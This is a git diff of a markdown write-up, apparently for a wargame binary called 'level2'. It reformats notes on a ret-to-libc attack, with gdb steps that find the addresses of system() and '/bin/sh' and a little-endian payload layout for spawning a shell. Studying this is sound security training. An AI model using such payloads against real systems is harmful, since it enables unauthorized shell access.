@@ -8,13 +8,15 @@ objdump -dC -M intel level2
 
 ## ret to libc
 
+### return address
 
-`system("/bin/sh")` : ret                 + system + "...." + "/bin/sh"
-
+```
+system("/bin/sh")` : ret                 + system + "...." + "/bin/sh"
                       "0x804854f"         + ...
-
                       "\x4f\x85\x04\x08"  + ...
+```
 
+### system address
 
 ```shell
 gdb level2
@@ -24,9 +26,13 @@ gdb level2
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ```
 
+```
 `system("/bin/sh")` : ret                 + system              + "...." + "/bin/sh"
                       "0x804854f"         + "0xb7e6b060"        + "...." + ...
                       "\x4f\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + ...
+```
+
+### "/bin/sh" address
 
 ```shell
 (gdb) info proc map
@@ -40,10 +46,11 @@ find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
   1 pattern found.
 ```
 
-`system("/bin/sh")` :   ret                 + system              + "...." + "/bin/sh"
-                        "0x804854f"         + "0xb7e6b060"        + "...." + "0xb7f8cc58"
-                        "\x4f\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7"
-
+```
+`system("/bin/sh")` : ret                 + system              + "...." + "/bin/sh"
+                      "0x804854f"         + "0xb7e6b060"        + "...." + "0xb7f8cc58"
+                      "\x4f\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7"
+```
 
 ## exploit
 
